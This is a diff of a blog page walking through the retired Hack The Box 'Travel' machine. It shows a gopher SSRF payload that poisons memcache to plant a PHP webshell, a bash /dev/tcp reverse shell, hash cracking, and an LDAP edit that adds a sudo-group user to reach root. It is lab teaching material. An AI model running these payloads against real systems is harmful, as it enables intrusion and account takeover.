@@ -375,7 +381,7 @@ O:14:"TemplateHelper":2:{s:4:"file";s:9:"shell.php";s:4:"data";s:34:"&lt;?php sy
 </ul>
 <h3 id="4-6-the-gopher-url">4.6 The Gopher URL</h3>
 <p>We URL-encode the memcache command for Gopher:</p>
-<pre><code>gopher://2130706433:11211/_%0d%0aset%20xct_4e5612ba079c530a6b1f148c0b352241%204%200%20106%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:9:%22shell.php%22%3Bs:4:%22data%22%3Bs:34:%22%3C%3Fphp%20system%28%24_REQUEST%5B%22cmd%22%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a
+<pre tabindex="0" aria-label="Code or terminal block 27"><code>gopher://2130706433:11211/_%0d%0aset%20xct_4e5612ba079c530a6b1f148c0b352241%204%200%20106%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:9:%22shell.php%22%3Bs:4:%22data%22%3Bs:34:%22%3C%3Fphp%20system%28%24_REQUEST%5B%22cmd%22%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a
 </code></pre>
 <p><strong>Breaking it down:</strong></p>
 <ul>
@@ -389,23 +395,23 @@ O:14:"TemplateHelper":2:{s:4:"file";s:9:"shell.php";s:4:"data";s:34:"&lt;?php sy
 </ul>
 <h3 id="4-7-executing-the-attack">4.7 Executing the Attack</h3>
 <p><strong>Step 1: Poison the cache</strong></p>
-<pre><code class="language-bash" data-language="bash">curl -s "http://blog.travel.htb/awesome-rss/?custom_feed_url&amp;url=gopher://2130706433:11211/_%0d%0aset%20xct_4e5612ba079c530a6b1f148c0b352241%204%200%20106%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:9:%22shell.php%22%3Bs:4:%22data%22%3Bs:34:%22%3C%3Fphp%20system%28%24_REQUEST%5B%22cmd%22%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a"
+<pre tabindex="0" aria-label="bash code or terminal block 28"><code class="language-bash" data-language="bash">curl -s "http://blog.travel.htb/awesome-rss/?custom_feed_url&amp;url=gopher://2130706433:11211/_%0d%0aset%20xct_4e5612ba079c530a6b1f148c0b352241%204%200%20106%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:9:%22shell.php%22%3Bs:4:%22data%22%3Bs:34:%22%3C%3Fphp%20system%28%24_REQUEST%5B%22cmd%22%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a"
 </code></pre>
 <p><strong>Step 2: Verify poisoning</strong></p>
-<pre><code class="language-bash" data-language="bash">curl -s "http://blog.travel.htb/awesome-rss/?debug" | grep TemplateHelper
+<pre tabindex="0" aria-label="bash code or terminal block 29"><code class="language-bash" data-language="bash">curl -s "http://blog.travel.htb/awesome-rss/?debug" | grep TemplateHelper
 </code></pre>
 <p>If you see the serialized object in the debug output, the cache now contains our payload.</p>
 <p><strong>Step 3: Trigger deserialization</strong></p>
-<pre><code class="language-bash" data-language="bash">curl -s "http://blog.travel.htb/awesome-rss/" &gt; /dev/null
+<pre tabindex="0" aria-label="bash code or terminal block 30"><code class="language-bash" data-language="bash">curl -s "http://blog.travel.htb/awesome-rss/" &gt; /dev/null
 </code></pre>
 <p>When SimplePie initializes, it reads from memcache, calls <code>unserialize()</code> on our payload, which triggers <code>__wakeup()</code>, which writes <code>shell.php</code>.</p>
 <p><strong>Step 4: Confirm RCE</strong></p>
-<pre><code class="language-bash" data-language="bash">curl -s "http://blog.travel.htb/wp-content/themes/twentytwenty/logs/shell.php?cmd=id"
+<pre tabindex="0" aria-label="bash code or terminal block 31"><code class="language-bash" data-language="bash">curl -s "http://blog.travel.htb/wp-content/themes/twentytwenty/logs/shell.php?cmd=id"
 </code></pre>
 <p><strong>Expected:</strong> <code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></p>
 <h3 id="4-8-upgrading-to-a-reverse-shell">4.8 Upgrading to a Reverse Shell</h3>
 <p>A webshell is fine, but an interactive shell is better. We use bash's built-in TCP redirection:</p>
-<pre><code class="language-bash" data-language="bash"># On Kali (listener)
+<pre tabindex="0" aria-label="bash code or terminal block 32"><code class="language-bash" data-language="bash"># On Kali (listener)
 nc -lvnp 4444
 
 # Trigger reverse shell via webshell
@@ -415,7 +421,7 @@ curl -G "http://blog.travel.htb/wp-content/themes/twentytwenty/logs/shell.php" \
 <p><strong>Mechanism:</strong>
 Bash can open TCP connections using <code>/dev/tcp/host/port</code> pseudo-devices. We redirect stdin (0), stdout (1), and stderr (2) to that TCP socket, giving the attacker a fully interactive shell.</p>
 <p><strong>Stabilizing the shell (optional but recommended):</strong></p>
-<pre><code class="language-bash" data-language="bash">python3 -c 'import pty; pty.spawn("/bin/bash")'
+<pre tabindex="0" aria-label="bash code or terminal block 33"><code class="language-bash" data-language="bash">python3 -c 'import pty; pty.spawn("/bin/bash")'
 # Press Ctrl+Z to background
 # On Kali:
 stty raw -echo; fg
@@ -425,7 +431,7 @@ export TERM=xterm
 <hr>
 <h2 id="phase-5-post-exploitation-escaping-the-container">Phase 5: Post-Exploitation: Escaping the Container</h2>
 <h3 id="5-1-discovering-we-re-in-a-container">5.1 Discovering We're in a Container</h3>
-<pre><code class="language-bash" data-language="bash">www-data@blog:/$ ls -la /.dockerenv
+<pre tabindex="0" aria-label="bash code or terminal block 34"><code class="language-bash" data-language="bash">www-data@blog:/$ ls -la /.dockerenv
 -rwxr-xr-x 1 root root 0 Apr 23 18:44 .dockerenv
 www-data@blog:/$ hostname
 blog
@@ -446,15 +452,15 @@ Containers are sandboxed, but they often share resources with the host. Look for
 <li>Credential files or backups that were copied into the container</li>
 </ul>
 <h3 id="5-2-finding-the-database-backup">5.2 Finding the Database Backup</h3>
-<pre><code class="language-bash" data-language="bash">www-data@blog:/$ ls -la /opt/wordpress/
+<pre tabindex="0" aria-label="bash code or terminal block 35"><code class="language-bash" data-language="bash">www-data@blog:/$ ls -la /opt/wordpress/
 backup-13-04-2020.sql
 </code></pre>
 <p><strong>Why is this here?</strong>
 This is a <strong>snapshot of the database from before deployment</strong>. Developers often create backups during migrations or before updates, then forget to remove them. The file is readable by any user.</p>
-<pre><code class="language-bash" data-language="bash">cat /opt/wordpress/backup-13-04-2020.sql | tail -n 20
+<pre tabindex="0" aria-label="bash code or terminal block 36"><code class="language-bash" data-language="bash">cat /opt/wordpress/backup-13-04-2020.sql | tail -n 20
 </code></pre>
 <p><strong>Discovery:</strong></p>
-<pre><code class="language-sql" data-language="sql">INSERT INTO `wp_users` VALUES 
+<pre tabindex="0" aria-label="sql code or terminal block 37"><code class="language-sql" data-language="sql">INSERT INTO `wp_users` VALUES 
 (1,'admin','$P$BIRXVj/ZG0YRiBH8gnRy0chBx67WuK/','admin','admin@travel.htb',...),
 (2,'lynik-admin','$P$B/wzJzd3pj/n7oTe2GGpi5HcIl4ppc.','lynik-admin','lynik@travel.htb',...);
 </code></pre>
@@ -468,7 +474,7 @@ This is a <strong>snapshot of the database from before deployment</strong>. Deve
 <p><strong>Why crack this?</strong>
 <code>lynik-admin</code> sounds like a system user, not just a WordPress user. If we can crack this, we might be able to <strong>reuse the password</strong> for SSH.</p>
 <h3 id="5-4-cracking-the-hash">5.4 Cracking the Hash</h3>
-<pre><code class="language-bash" data-language="bash"># On Kali
+<pre tabindex="0" aria-label="bash code or terminal block 38"><code class="language-bash" data-language="bash"># On Kali
 echo 'lynik-admin:$P$B/wzJzd3pj/n7oTe2GGpi5HcIl4ppc.' &gt; hash.txt
 john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 </code></pre>
@@ -479,38 +485,38 @@ John (or Hashcat) takes each password from the wordlist, hashes it with the same
 <h2 id="phase-6-moving-to-the-host-via-ssh">Phase 6: Moving to the Host via SSH</h2>
 <h3 id="6-1-why-ssh">6.1 Why SSH?</h3>
 <p>We could try to escape the container via kernel exploits or mounted volumes, but those are unreliable. <strong>Credential reuse</strong> is much faster. If <code>lynik-admin</code> uses the same password for SSH, we can walk right out of the container.</p>
-<pre><code class="language-bash" data-language="bash">ssh lynik-admin@10.129.2.151
+<pre tabindex="0" aria-label="bash code or terminal block 39"><code class="language-bash" data-language="bash">ssh lynik-admin@10.129.2.151
 # password: REDACTED
 </code></pre>
 <p><strong>Why it works:</strong>
 The SSH server is configured to allow password authentication for <code>lynik-admin</code> (and <code>trvl-admin</code>), while everyone else must use keys. This is visible in <code>/etc/ssh/sshd_config</code>:</p>
-<pre><code>PasswordAuthentication no
+<pre tabindex="0" aria-label="Code or terminal block 40"><code>PasswordAuthentication no
 Match User trvl-admin,lynik-admin
     PasswordAuthentication yes
 </code></pre>
 <h3 id="6-2-grabbing-the-user-flag">6.2 Grabbing the User Flag</h3>
-<pre><code class="language-bash" data-language="bash">lynik-admin@travel:~$ cat user.txt
+<pre tabindex="0" aria-label="bash code or terminal block 41"><code class="language-bash" data-language="bash">lynik-admin@travel:~$ cat user.txt
 9aecc[redacted]fdbffb07
 </code></pre>
 <hr>
 <h2 id="phase-7-privilege-escalation-to-root-via-ldap">Phase 7: Privilege Escalation to Root via LDAP</h2>
 <h3 id="7-1-finding-ldap-credentials">7.1 Finding LDAP Credentials</h3>
-<pre><code class="language-bash" data-language="bash">lynik-admin@travel:~$ cat ~/.ldaprc
+<pre tabindex="0" aria-label="bash code or terminal block 42"><code class="language-bash" data-language="bash">lynik-admin@travel:~$ cat ~/.ldaprc
 HOST ldap.travel.htb
 BASE dc=travel,dc=htb
 BINDDN cn=lynik-admin,dc=travel,dc=htb
 </code></pre>
 <p>This file tells the LDAP client how to connect. But the password is missing.</p>
-<pre><code class="language-bash" data-language="bash">lynik-admin@travel:~$ cat ~/.viminfo
+<pre tabindex="0" aria-label="bash code or terminal block 43"><code class="language-bash" data-language="bash">lynik-admin@travel:~$ cat ~/.viminfo
 </code></pre>
 <p>Inside <code>.viminfo</code>, we find:</p>
-<pre><code>""1	LINE	0
+<pre tabindex="0" aria-label="Code or terminal block 44"><code>""1	LINE	0
 	BINDPW Theroadlesstraveled
 </code></pre>
 <p><strong>What is <code>.viminfo</code>?</strong>
 Vim stores history, registers, and deleted text in <code>.viminfo</code>. The developer edited <code>.ldaprc</code>, deleted the <code>BINDPW</code> line, saved the file, but <strong>Vim remembered the deletion</strong>. This is a classic OPSEC failure.</p>
 <h3 id="7-2-ldap-enumeration">7.2 LDAP Enumeration</h3>
-<pre><code class="language-bash" data-language="bash">lynik-admin@travel:~$ ldapsearch -x -w Theroadlesstraveled
+<pre tabindex="0" aria-label="bash code or terminal block 45"><code class="language-bash" data-language="bash">lynik-admin@travel:~$ ldapsearch -x -w Theroadlesstraveled
 </code></pre>
 <p><strong>What this shows:</strong></p>
 <ul>
@@ -522,7 +528,7 @@ Vim stores history, registers, and deleted text in <code>.viminfo</code>. The de
 <p>
 As an LDAP admin, we have <strong>write access</strong> to user attributes. In environments where SSH authenticates against LDAP, modifying LDAP is equivalent to modifying <code>/etc/passwd</code> and <code>/etc/shadow</code>.</p>
 <h3 id="7-3-understanding-the-ssh-ldap-integration">7.3 Understanding the SSH/LDAP Integration</h3>
-<pre><code class="language-bash" data-language="bash">lynik-admin@travel:~$ cat /etc/ssh/sshd_config | grep -v '^#' | grep .
+<pre tabindex="0" aria-label="bash code or terminal block 46"><code class="language-bash" data-language="bash">lynik-admin@travel:~$ cat /etc/ssh/sshd_config | grep -v '^#' | grep .
 AuthorizedKeysCommand /usr/bin/sss_ssh_authorizedkeys
 AuthorizedKeysCommandUser nobody
 PasswordAuthentication no
@@ -539,9 +545,9 @@ Match User trvl-admin,lynik-admin
 <p><strong>The implication:</strong>
 If we add an <code>sshPublicKey</code> attribute to any LDAP user, we can SSH as them. If we also set their <code>gidNumber</code> to <code>27</code> (the <code>sudo</code> group) and give them a password, we can <code>sudo su -</code> to root.</p>
 <h3 id="7-4-why-we-can-t-just-modify-root">7.4 Why We Can't Just Modify Root</h3>
-<pre><code class="language-bash" data-language="bash">cat /etc/sssd/sssd.conf
+<pre tabindex="0" aria-label="bash code or terminal block 47"><code class="language-bash" data-language="bash">cat /etc/sssd/sssd.conf
 </code></pre>
-<pre><code class="language-ini" data-language="ini">[nss]
+<pre tabindex="0" aria-label="ini code or terminal block 48"><code class="language-ini" data-language="ini">[nss]
 filter_users = root
 filter_groups = root
 </code></pre>
@@ -555,7 +561,7 @@ filter_groups = root
 </ol>
 <h3 id="7-6-understanding-ldif-ldap-data-interchange-format">7.6 Understanding LDIF (LDAP Data Interchange Format)</h3>
 <p>An LDIF file describes changes to LDAP entries. The format is strict:</p>
-<pre><code class="language-ldif" data-language="ldif">dn: &lt;distinguished name&gt;
+<pre tabindex="0" aria-label="ldif code or terminal block 49"><code class="language-ldif" data-language="ldif">dn: &lt;distinguished name&gt;
 changeType: modify
 &lt;operation&gt;: &lt;attribute&gt;
 &lt;attribute&gt;: &lt;value&gt;
@@ -569,7 +575,7 @@ changeType: modify
 <li><code>-</code> = separator between operations</li>
 </ul>
 <h3 id="7-7-creating-the-payload-ldif">7.7 Creating the Payload LDIF</h3>
-<pre><code class="language-ldif" data-language="ldif">dn: uid=johnny,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
+<pre tabindex="0" aria-label="ldif code or terminal block 50"><code class="language-ldif" data-language="ldif">dn: uid=johnny,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
 changeType: modify
 replace: gidNumber
 gidNumber: 27
@@ -586,17 +592,17 @@ sshPublicKey: ssh-rsa REDACTED_ENCODED_LAB_MATERIAL kali@kali
 <p><strong>Why we need <code>ldapPublicKey</code>:</strong>
 The <code>sshPublicKey</code> attribute isn't valid for all object classes. We must first add the <code>ldapPublicKey</code> object class to the user's entry, which then allows the <code>sshPublicKey</code> attribute.</p>
 <h3 id="7-8-applying-the-ldap-changes">7.8 Applying the LDAP Changes</h3>
-<pre><code class="language-bash" data-language="bash">ldapadd -D "cn=lynik-admin,dc=travel,dc=htb" -w Theroadlesstraveled -f /dev/shm/johnny.ldif
+<pre tabindex="0" aria-label="bash code or terminal block 51"><code class="language-bash" data-language="bash">ldapadd -D "cn=lynik-admin,dc=travel,dc=htb" -w Theroadlesstraveled -f /dev/shm/johnny.ldif
 </code></pre>
 <p><strong>Output:</strong></p>
-<pre><code>modifying entry "uid=johnny,ou=users,ou=linux,ou=servers,dc=travel,dc=htb"
+<pre tabindex="0" aria-label="Code or terminal block 52"><code>modifying entry "uid=johnny,ou=users,ou=linux,ou=servers,dc=travel,dc=htb"
 </code></pre>
 <h3 id="7-9-verifying-the-changes">7.9 Verifying the Changes</h3>
-<pre><code class="language-bash" data-language="bash">/usr/bin/sss_ssh_authorizedkeys johnny
+<pre tabindex="0" aria-label="bash code or terminal block 53"><code class="language-bash" data-language="bash">/usr/bin/sss_ssh_authorizedkeys johnny
 </code></pre>
 <p>This should print the SSH public key we just added, confirming SSH will accept it.</p>
 <h3 id="7-10-ssh-as-johnny">7.10 SSH as Johnny</h3>
-<pre><code class="language-bash" data-language="bash"># On Kali
+<pre tabindex="0" aria-label="bash code or terminal block 54"><code class="language-bash" data-language="bash"># On Kali
 ssh -i /tmp/travel_key johnny@10.129.2.151
 </code></pre>
 <p><strong>What happens:</strong></p>
@@ -607,12 +613,12 @@ ssh -i /tmp/travel_key johnny@10.129.2.151
 <li>Authentication succeeds</li>
 <li>We log in as <code>johnny</code></li>
 </ul>
-<pre><code class="language-bash" data-language="bash">johnny@travel:~$ id
+<pre tabindex="0" aria-label="bash code or terminal block 55"><code class="language-bash" data-language="bash">johnny@travel:~$ id
 uid=5004(johnny) gid=27(sudo) groups=27(sudo),5000(domainusers)
 </code></pre>
 <p><strong>The <code>gid=27(sudo)</code> is the key.</strong> Johnny is now a member of the sudo group.</p>
 <h3 id="7-11-becoming-root">7.11 Becoming Root</h3>
-<pre><code class="language-bash" data-language="bash">johnny@travel:~$ sudo su -
+<pre tabindex="0" aria-label="bash code or terminal block 56"><code class="language-bash" data-language="bash">johnny@travel:~$ sudo su -
 [sudo] password for johnny: hacked123
 root@travel:~#
 </code></pre>
@@ -623,7 +629,7 @@ root@travel:~#
 <li><code>su -</code> switches to root and loads root's environment</li>
 </ul>
 <h3 id="7-12-the-root-flag">7.12 The Root Flag</h3>
-<pre><code class="language-bash" data-language="bash">root@travel:~# cat /root/root.txt
+<pre tabindex="0" aria-label="bash code or terminal block 57"><code class="language-bash" data-language="bash">root@travel:~# cat /root/root.txt
 4b10d5[redacted]ff045abc5
 </code></pre>
 <hr>
@@ -668,9 +674,9 @@ root@travel:~#
 <td><code>4b10d5[redacted]f045abc5</code></td>
 </tr>
 </tbody></table>
-<hr>6:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$c"}}]
-7:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing navigation","data-motion":"group","children":[["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-trick-walkthrough","data-motion-surface":"control","children":[["$","span",null,{"data-depth-layer":"meta","children":"More recent in Hack The Box"}],["$","strong",null,{"data-depth-layer":"title","children":"Hack The Box: Trick Walkthrough"}],["$","time",null,{"dateTime":"2026-06-11T10:55:45.000Z","data-depth-layer":"meta","children":"11 Jun 2026"}]]}]}],["$","$L2",null,{"className":"article-pagination-index","href":"/writing","children":["All ",127," articles"]}],["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-thenotebook-walkthrough","data-motion-surface":"control","children":[["$","span",null,{"data-depth-layer":"meta","children":"Earlier in Hack The Box"}],["$","strong",null,{"data-depth-layer":"title","children":"Hack The Box: TheNotebook Walkthrough"}],["$","time",null,{"dateTime":"2026-06-11T10:47:55.000Z","data-depth-layer":"meta","children":"11 Jun 2026"}]]}]}]]}]
-8:["$","footer",null,{"className":"site-footer","data-motion":"section","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L2",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Penetration Tester at Ejabi InfoSec · Security Researcher"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L2","About",{"href":"/about","children":"About"}],["$","$L2","Projects",{"href":"/projects","children":"Projects"}],["$","$L2","Research",{"href":"/research","children":"Research"}],["$","$L2","Writing",{"href":"/writing","children":"Writing"}],["$","$L2","Services",{"href":"/services","children":"Services"}],["$","$L2","Contact",{"href":"/contact","children":"Contact"}],["$","$L2","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Contact and public profiles","children":[["$","$L2","Business email",{"href":"/contact","children":["Business email"," ",["$","span",null,{"aria-hidden":"true","children":"→"}],["$","span",null,{"className":"sr-only","children":" opens the browser-based contact options"}]]}],["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Discord",{"href":"https://discord.com/invite/f6dryR2uGt","target":"_blank","rel":"noreferrer","children":["Discord"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}],["$","$Ld",null,{}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Security research · engineering background · clear reporting"}],["$","$L2",null,{"href":"/about#career","children":"View professional background →"}]]}]]}]
-e:T58a,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-travel-walkthrough/#article","headline":"Hack The Box: Travel Walkthrough","description":"An exposed Git repository documented an SSRF chain that poisoned memcache with a PHP object for code execution, a forgotten database backup yielded lynik-admin's SSH password, and LDAP write access added a sudo-group user with an attacker key.","url":"https://cyberkareem.com/writing/hackthebox-travel-walkthrough/","datePublished":"2026-06-11T10:54:17.000Z","dateModified":"2026-06-11T10:54:17.000Z","wordCount":3493,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/3aee13cd377cbe7fe3c4c69c628157d7840f7800/HTB-Travel.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/social/v2/writing/hackthebox-travel-walkthrough.png","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-travel-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Travel Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-travel-walkthrough/"}]}]}9:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$e"}}]
-a:["$","$Lf",null,{"children":["$","$10",null,{"name":"Next.MetadataOutlet","children":"$@11"}]}]
-11:null
+<hr>c:["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article context","data-motion":"fade","children":[["$","$L11",null,{"headings":[{"id":"introduction-the-big-picture","label":"Introduction: The Big Picture"},{"id":"phase-1-external-reconnaissance-mapping-the-attack-surface","label":"Phase 1: External Reconnaissance: Mapping the Attack Surface"},{"id":"phase-2-finding-the-entry-point-the-exposed-git-repository","label":"Phase 2: Finding the Entry Point: The Exposed Git Repository"},{"id":"phase-3-source-code-analysis-understanding-the-application","label":"Phase 3: Source Code Analysis: Understanding the Application"},{"id":"phase-4-exploiting-the-vulnerability-chain","label":"Phase 4: Exploiting the Vulnerability Chain"},{"id":"phase-5-post-exploitation-escaping-the-container","label":"Phase 5: Post-Exploitation: Escaping the Container"},{"id":"phase-6-moving-to-the-host-via-ssh","label":"Phase 6: Moving to the Host via SSH"},{"id":"phase-7-privilege-escalation-to-root-via-ldap","label":"Phase 7: Privilege Escalation to Root via LDAP"},{"id":"phase-8-lessons-learned-and-defense","label":"Phase 8: Lessons Learned & Defense"},{"id":"flags","label":"Flags"}]}],["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Source"}],[["$","p",null,{"children":"Technical source and supporting notes."}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/3aee13cd377cbe7fe3c4c69c628157d7840f7800/HTB-Travel.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision",["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","small",null,{"children":["CyberKareem/OSWE-Prep",", commit 3aee13cd377c",""]}]]]}],["$","div",null,{"className":"article-review-note article-review-lab-safety","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Travel, Linux, Hard",". Retirement verified ","12 Jul 2026","."," ","This walkthrough covers an authorized lab. Use these techniques only on systems you own or are explicitly authorized to test."]}],["$","a",null,{"href":"https://www.hackthebox.com/machines/travel","target":"_blank","rel":"nofollow noopener noreferrer","children":["View public machine page ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}],[["$","div","source-context-0",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"Source context"}],["$","p",null,{"children":"Based on Abdullah Kareem's public preparation notes and edited for clarity. Commands and technical claims remain tied to the documented lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}],["$","div","editorial-correction-1",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"6 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]]]}],["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$12"}}]]}]
+d:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing navigation","data-motion":"group","children":[["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-trick-walkthrough","data-motion-surface":"control","children":[["$","span",null,{"data-depth-layer":"meta","children":"More recent in Hack The Box"}],["$","strong",null,{"data-depth-layer":"title","children":"Hack The Box: Trick Walkthrough"}],["$","time",null,{"dateTime":"2026-06-11T10:55:45.000Z","data-depth-layer":"meta","children":"11 Jun 2026"}]]}]}],["$","$L2",null,{"className":"article-pagination-index","href":"/writing","children":["All ",127," articles"]}],["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-thenotebook-walkthrough","data-motion-surface":"control","children":[["$","span",null,{"data-depth-layer":"meta","children":"Earlier in Hack The Box"}],["$","strong",null,{"data-depth-layer":"title","children":"Hack The Box: TheNotebook Walkthrough"}],["$","time",null,{"dateTime":"2026-06-11T10:47:55.000Z","data-depth-layer":"meta","children":"11 Jun 2026"}]]}]}]]}]
+e:["$","footer",null,{"className":"site-footer","data-motion":"section","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L2",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Penetration Tester at Ejabi InfoSec · Security Researcher"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L2","About",{"href":"/about","children":"About"}],["$","$L2","Projects",{"href":"/projects","children":"Projects"}],["$","$L2","Research",{"href":"/research","children":"Research"}],["$","$L2","Writing",{"href":"/writing","children":"Writing"}],["$","$L2","Services",{"href":"/services","children":"Services"}],["$","$L2","Contact",{"href":"/contact","children":"Contact"}],["$","$L2","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Contact and public profiles","children":[["$","$L2","Business email",{"href":"/contact","children":["Business email"," ",["$","span",null,{"aria-hidden":"true","children":"→"}],["$","span",null,{"className":"sr-only","children":" opens the browser-based contact options"}]]}],["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Discord",{"href":"https://discord.com/invite/f6dryR2uGt","target":"_blank","rel":"noreferrer","children":["Discord"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}],["$","$L13",null,{}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Security research · engineering background · clear reporting"}],["$","$L2",null,{"href":"/about#career","children":"View professional background →"}]]}]]}]
